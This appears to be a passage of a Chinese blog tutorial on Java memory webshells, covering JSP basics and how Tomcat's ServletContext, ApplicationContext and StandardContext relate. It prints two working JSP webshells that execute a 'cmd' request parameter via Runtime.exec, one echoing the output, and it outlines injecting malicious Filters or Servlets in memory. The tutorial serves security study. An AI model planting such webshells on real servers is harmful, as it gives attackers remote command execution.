+<a class=anchor href=#jsp-%e6%8c%87%e4%bb%a4>#</a></h4><p>JSP 指令用来设置于整个 JSP 页面相关的属性。三种 JSP 指令：</p><p><img src=https://drun1baby.top/2022/08/21/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-02-%E5%86%85%E5%AD%98%E9%A9%AC%E4%BB%8B%E7%BB%8D/ThreeJSPCommand.png alt=1></p><p>比如我们可以通过 page 指令用来设置 JSP 页面的编码格式：</p><pre tabindex=0><code class=language-jsp data-lang=jsp>&lt;%@ page language=&#34;java&#34; contentType=&#34;text/html; charset=UTF-8&#34; pageEncoding=&#34;UTF-8&#34;%&gt;
+</code></pre><h4 id=jsp-注释>JSP 注释
+<a class=anchor href=#jsp-%e6%b3%a8%e9%87%8a>#</a></h4><p>格式：</p><pre tabindex=0><code class=language-jsp data-lang=jsp>&lt;%-- 注释内容 --%&gt;
+</code></pre><h4 id=jsp-内置对象>JSP 内置对象
+<a class=anchor href=#jsp-%e5%86%85%e7%bd%ae%e5%af%b9%e8%b1%a1>#</a></h4><p>JSP有九大内置对象，他们能够在客户端和服务器端交互的过程中分别完成不同的功能。其特点如下：</p><ul><li>由 JSP 规范提供，不用编写者实例化</li><li>通过 Web 容器实现和管理</li><li>所有 JSP 页面均可使用</li><li>只有在脚本元素的表达式或代码段中才能使用</li></ul><table><thead><tr><th>对 象</th><th>类型</th><th>说 明</th></tr></thead><tbody><tr><td>request</td><td>javax.servlet.http.HttpServletRequest</td><td>获取用户请求信息</td></tr><tr><td>response</td><td>javax.servlet.http.HttpServletResponse</td><td>响应客户端请求，并将处理信息返回到客户端</td></tr><tr><td>out</td><td>javax.servlet.jsp.JspWriter</td><td>输出内容到 HTML 中</td></tr><tr><td>session</td><td>javax.servlet.http.HttpSession</td><td>用来保存用户信息</td></tr><tr><td>application</td><td>javax.servlet.ServletContext</td><td>所有用户共享信息</td></tr><tr><td>config</td><td>javax.servlet.ServletConfig</td><td>这是一个 Servlet 配置对象，用于 Servlet 和页面的初始化参数</td></tr><tr><td>pageContext</td><td>javax.servlet.jsp.PageContext</td><td>JSP 的页面容器，用于访问 page、request、application 和 session 的属性</td></tr><tr><td>page</td><td>javax.servlet.jsp.HttpJspPage</td><td>类似于 Java 类的 this 关键字，表示当前 JSP 页面</td></tr><tr><td>exception</td><td>java.lang.Throwable</td><td>该对象用于处理 JSP 文件执行时发生的错误和异常；只有在 JSP 页面的 page 指令中指定 isErrorPage 的取值 true 时，才可以在本页面使用 exception 对象。</td></tr></tbody></table><h2 id=传统内存马>传统内存马
+<a class=anchor href=#%e4%bc%a0%e7%bb%9f%e5%86%85%e5%ad%98%e9%a9%ac>#</a></h2><p>我们先看看传统的 JSP 内存马：</p><pre tabindex=0><code class=language-jsp data-lang=jsp>&lt;%
+    String cmd = request.getParameter(&#34;cmd&#34;);
+    Runtime.getRuntime().exec(cmd);
+%&gt;
+</code></pre><p>上面是最简单的一句话木马，没有回显，适合用来反弹 shell。</p><p>下面是一个带回显的 JSP 木马：</p><pre tabindex=0><code class=language-jsp data-lang=jsp>&lt;% if(request.getParameter(&#34;cmd&#34;)!=null){
+    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&#34;cmd&#34;)).getInputStream();
+    int a = -1;
+    byte[] b = new byte[2048];
+    out.print(&#34;&lt;pre&gt;&#34;);
+    while((a=in.read(b))!=-1){
+        out.print(new String(b));
+    }
+    out.print(&#34;&lt;/pre&gt;&#34;);
+}
+ 
+%&gt;
+</code></pre><p>传统的 JSP 木马特征性强，且需要文件落地，容易被查杀，因此出现了内存马技术。Java 内存马又叫做“无文件马”，相较于传统的 JSP 木马，其最大的特点就是无文件落地，存在于内存中，隐蔽性强。</p><ul><li>利用 Java Web 组件：动态添加恶意组件，如 Servlet、Filter、Listener 等。在 Spring 框架下就是 Controller、Intercepter。</li><li>修改字节码：利用 Java 的 Instrument 机制，动态注入 Agent，在 Java 内存中动态修改字节码，在 HTTP 请求执行路径中的类中添加恶意代码，可以实现根据请求的参数执行任意代码。</li></ul><h2 id=tomcat-中的三个-context-的理解>Tomcat 中的三个 Context 的理解
+<a class=anchor href=#tomcat-%e4%b8%ad%e7%9a%84%e4%b8%89%e4%b8%aa-context-%e7%9a%84%e7%90%86%e8%a7%a3>#</a></h2><h3 id=context>Context
+<a class=anchor href=#context>#</a></h3><p>Context 就是上下文，在 Java 中经常看到这个东西。</p><p>Context 相当于是事件发生的背景。在 Web 请求中，当一次 request 请求发生时，背景，也就是 Context 会记录当时的情形：当时 Web 容器中有几个 Filter，有什么 Servlet，有什么 Listener，请求的参数，请求的路径，有没有全局的参数等等。</p><h3 id=servletcontext>ServletContext
+<a class=anchor href=#servletcontext>#</a></h3><p>ServletContext 是 Servlet 规范中规定的 ServletContext 接口，一般 Servlet 都要实现这个接口。</p><p>大致就是规定了如果要实现一个 Web 容器，它的 Context 中要有这些东西：获取路径、获取参数、获取当前 Filter、获取当前 Servlet 等。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> javax.servlet;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.InputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.net.MalformedURLException;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.net.URL;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.Enumeration;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.EnumSet;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.EventListener;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.Map;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.Set;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.servlet.descriptor.JspConfigDescriptor;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>interface</span> <span style=color:#a6e22e>ServletContext</span> {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>final</span> String TEMPDIR <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;javax.servlet.context.tempdir&#34;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>final</span> String ORDERED_LIBS <span style=color:#f92672>=</span>
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;javax.servlet.context.orderedLibs&#34;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>getContextPath</span>();
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> ServletContext <span style=color:#a6e22e>getContext</span>(String uripath);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>getMajorVersion</span>();
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>getMinorVersion</span>();
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>getEffectiveMajorVersion</span>();
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>getEffectiveMinorVersion</span>();
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>getMimeType</span>(String file);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> Set<span style=color:#f92672>&lt;</span>String<span style=color:#f92672>&gt;</span> <span style=color:#a6e22e>getResourcePaths</span>(String path);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> URL <span style=color:#a6e22e>getResource</span>(String path) <span style=color:#66d9ef>throws</span> MalformedURLException;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> InputStream <span style=color:#a6e22e>getResourceAsStream</span>(String path);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> RequestDispatcher <span style=color:#a6e22e>getRequestDispatcher</span>(String path);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> RequestDispatcher <span style=color:#a6e22e>getNamedDispatcher</span>(String name);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Deprecated</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> Servlet <span style=color:#a6e22e>getServlet</span>(String name) <span style=color:#66d9ef>throws</span> ServletException;
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Deprecated</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> Enumeration<span style=color:#f92672>&lt;</span>Servlet<span style=color:#f92672>&gt;</span> <span style=color:#a6e22e>getServlets</span>();
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Deprecated</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> Enumeration<span style=color:#f92672>&lt;</span>String<span style=color:#f92672>&gt;</span> <span style=color:#a6e22e>getServletNames</span>();
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>log</span>(String msg);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Deprecated</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>log</span>(Exception exception, String msg);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>log</span>(String message, Throwable throwable);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>getRealPath</span>(String path);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>getServerInfo</span>();
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>getInitParameter</span>(String name);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> Enumeration<span style=color:#f92672>&lt;</span>String<span style=color:#f92672>&gt;</span> <span style=color:#a6e22e>getInitParameterNames</span>();
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>boolean</span> <span style=color:#a6e22e>setInitParameter</span>(String name, String value);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> Object <span style=color:#a6e22e>getAttribute</span>(String name);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> Enumeration<span style=color:#f92672>&lt;</span>String<span style=color:#f92672>&gt;</span> <span style=color:#a6e22e>getAttributeNames</span>();
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>setAttribute</span>(String name, Object object);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>removeAttribute</span>(String name);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>getServletContextName</span>();
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> ServletRegistration.<span style=color:#a6e22e>Dynamic</span> <span style=color:#a6e22e>addServlet</span>(
+</span></span><span style=display:flex><span>        String servletName, String className);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> ServletRegistration.<span style=color:#a6e22e>Dynamic</span> <span style=color:#a6e22e>addServlet</span>(
+</span></span><span style=display:flex><span>        String servletName, Servlet servlet);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> ServletRegistration.<span style=color:#a6e22e>Dynamic</span> <span style=color:#a6e22e>addServlet</span>(String servletName,
+</span></span><span style=display:flex><span>        Class <span style=color:#f92672>&lt;?</span> <span style=color:#66d9ef>extends</span> Servlet<span style=color:#f92672>&gt;</span> servletClass);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> ServletRegistration.<span style=color:#a6e22e>Dynamic</span> <span style=color:#a6e22e>addJspFile</span>(
+</span></span><span style=display:flex><span>        String servletName, String jspFile);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#f92672>&lt;</span>T <span style=color:#66d9ef>extends</span> Servlet<span style=color:#f92672>&gt;</span> T <span style=color:#a6e22e>createServlet</span>(Class<span style=color:#f92672>&lt;</span>T<span style=color:#f92672>&gt;</span> clazz)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>throws</span> ServletException;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> ServletRegistration <span style=color:#a6e22e>getServletRegistration</span>(String servletName);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> Map<span style=color:#f92672>&lt;</span>String, <span style=color:#f92672>?</span> <span style=color:#66d9ef>extends</span> ServletRegistration<span style=color:#f92672>&gt;</span> <span style=color:#a6e22e>getServletRegistrations</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> FilterRegistration.<span style=color:#a6e22e>Dynamic</span> <span style=color:#a6e22e>addFilter</span>(
+</span></span><span style=display:flex><span>        String filterName, String className);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> FilterRegistration.<span style=color:#a6e22e>Dynamic</span> <span style=color:#a6e22e>addFilter</span>(
+</span></span><span style=display:flex><span>        String filterName, Filter filter);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> FilterRegistration.<span style=color:#a6e22e>Dynamic</span> <span style=color:#a6e22e>addFilter</span>(String filterName,
+</span></span><span style=display:flex><span>        Class <span style=color:#f92672>&lt;?</span> <span style=color:#66d9ef>extends</span> Filter<span style=color:#f92672>&gt;</span> filterClass);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#f92672>&lt;</span>T <span style=color:#66d9ef>extends</span> Filter<span style=color:#f92672>&gt;</span> T <span style=color:#a6e22e>createFilter</span>(Class<span style=color:#f92672>&lt;</span>T<span style=color:#f92672>&gt;</span> clazz)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>throws</span> ServletException;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> FilterRegistration <span style=color:#a6e22e>getFilterRegistration</span>(String filterName);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> Map<span style=color:#f92672>&lt;</span>String, <span style=color:#f92672>?</span> <span style=color:#66d9ef>extends</span> FilterRegistration<span style=color:#f92672>&gt;</span> <span style=color:#a6e22e>getFilterRegistrations</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> SessionCookieConfig <span style=color:#a6e22e>getSessionCookieConfig</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>setSessionTrackingModes</span>(Set<span style=color:#f92672>&lt;</span>SessionTrackingMode<span style=color:#f92672>&gt;</span> sessionTrackingModes);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> Set<span style=color:#f92672>&lt;</span>SessionTrackingMode<span style=color:#f92672>&gt;</span> <span style=color:#a6e22e>getDefaultSessionTrackingModes</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> Set<span style=color:#f92672>&lt;</span>SessionTrackingMode<span style=color:#f92672>&gt;</span> <span style=color:#a6e22e>getEffectiveSessionTrackingModes</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>addListener</span>(String className);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#f92672>&lt;</span>T <span style=color:#66d9ef>extends</span> EventListener<span style=color:#f92672>&gt;</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>addListener</span>(T t);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>addListener</span>(Class <span style=color:#f92672>&lt;?</span> <span style=color:#66d9ef>extends</span> EventListener<span style=color:#f92672>&gt;</span> listenerClass);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#f92672>&lt;</span>T <span style=color:#66d9ef>extends</span> EventListener<span style=color:#f92672>&gt;</span> T <span style=color:#a6e22e>createListener</span>(Class<span style=color:#f92672>&lt;</span>T<span style=color:#f92672>&gt;</span> clazz)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>throws</span> ServletException;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> JspConfigDescriptor <span style=color:#a6e22e>getJspConfigDescriptor</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> ClassLoader <span style=color:#a6e22e>getClassLoader</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>declareRoles</span>(String... roleNames);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>getVirtualServerName</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>getSessionTimeout</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>setSessionTimeout</span>(<span style=color:#66d9ef>int</span> sessionTimeout);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>getRequestCharacterEncoding</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>setRequestCharacterEncoding</span>(String encoding);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>getResponseCharacterEncoding</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>setResponseCharacterEncoding</span>(String encoding);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>可以看到 ServletContext 接口中定义了很多操作，能对 Servlet 中的各种资源进行访问、添加、删除等。</p><h3 id=applicationcontext>ApplicationContext
+<a class=anchor href=#applicationcontext>#</a></h3><p>在 Tomcat 中，ServletContext 规范的实现是 ApplicationContext，因为门面模式的原因，实际套了一层 ApplicationContextFacade。</p><p>其中 ApplicationContext 实现了 ServletContext 规范定义的一些方法，比如<code>addServlet()</code>、<code>addFilter()</code>等。</p><h3 id=standardcontext>StandardContext
+<a class=anchor href=#standardcontext>#</a></h3><p><code>org.apache.catalina.core.StandardContext</code>是子容器<code>Context</code>的标准实现类，其中包含了对 Context 子容器中资源的各种操作。四种子容器都有其对应的标准实现：</p><p><img src=https://drun1baby.top/2022/08/21/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-02-%E5%86%85%E5%AD%98%E9%A9%AC%E4%BB%8B%E7%BB%8D/StandardContext.png alt=1></p><p>而在 ApplicationContext 类中，对资源的各种操作实际上是调用了 StandardContext 中的方法。</p><p><img src=https://drun1baby.top/2022/08/21/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-02-%E5%86%85%E5%AD%98%E9%A9%AC%E4%BB%8B%E7%BB%8D/Use.png alt=1></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span>...
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>@Override</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>getRequestCharacterEncoding</span>() {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> context.<span style=color:#a6e22e>getRequestCharacterEncoding</span>();
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>...
+</span></span></code></pre></div><h3 id=tomcat-三个-context-的总结>Tomcat 三个 Context 的总结
+<a class=anchor href=#tomcat-%e4%b8%89%e4%b8%aa-context-%e7%9a%84%e6%80%bb%e7%bb%93>#</a></h3><p>用一张图来表示各个 Context 之间的关系：</p><p><img src=https://drun1baby.top/2022/08/21/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-02-%E5%86%85%E5%AD%98%E9%A9%AC%E4%BB%8B%E7%BB%8D/ThreeContext.png alt=1></p><p>ServletContext 接口的实现类为 ApplicationContext 类和 ApplicationContextFacade 类，其中 ApplicationContextFacade 是对 ApplicationContext 类的包装。我们对 Context 容器中各种资源进行操作时，最终调用的还是 StandardContext 中的方法，因此 StandardContext 是 Tomcat 中负责与底层交互的 Context。</p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#内存马简史>内存马简史</a></li><li><a href=#jsp-基础>JSP 基础</a><ul><li><a href=#什么是-jsp>什么是 JSP</a></li><li><a href=#jsp-语法>JSP 语法</a></li></ul></li><li><a href=#传统内存马>传统内存马</a></li><li><a href=#tomcat-中的三个-context-的理解>Tomcat 中的三个 Context 的理解</a><ul><li><a href=#context>Context</a></li><li><a href=#servletcontext>ServletContext</a></li><li><a href=#applicationcontext>ApplicationContext</a></li><li><a href=#standardcontext>StandardContext</a></li><li><a href=#tomcat-三个-context-的总结>Tomcat 三个 Context 的总结</a></li></ul></li></ul></nav></div></aside></main><script>(function(){var e,n,t=document.querySelector(".homepage-tree");t&&t.addEventListener("click",function(e){var t,n,s,i=e.target.closest(".home-tree-toggle"),a=e.target.closest(".home-section-label"),o=i||a;if(!o)return;if(s=o.closest("li"),!s)return;if(n=s.querySelector(".home-tree-children"),t=s.querySelector(".home-tree-toggle"),!n||!t)return;e.preventDefault(),n.classList.contains("hidden")?(n.classList.remove("hidden"),t.classList.remove("collapsed"),t.classList.add("expanded")):(n.classList.add("hidden"),t.classList.remove("expanded"),t.classList.add("collapsed"))}),e=document.createElement("div"),e.className="preview-tooltip",document.body.appendChild(e),document.querySelectorAll(".home-article-link[data-summary]").forEach(function(t){t.addEventListener("mouseenter",function(s){if(window.innerWidth<=768)return;var o=t.getAttribute("data-summary");if(!o)return;n=setTimeout(function(){var t,n,i=o.length>200?o.substring(0,200)+"...":o;e.textContent=i,e.style.display="block",t=s.clientX+15,n=s.clientY+15,t+420>window.innerWidth&&(t=s.clientX-420-15),n+100>window.innerHeight&&(n=s.clientY-100),e.style.left=t+"px",e.style.top=n+"px"},500)}),t.addEventListener("mouseleave",function(){clearTimeout(n),e.style.display="none"})})})()</script></body></html>
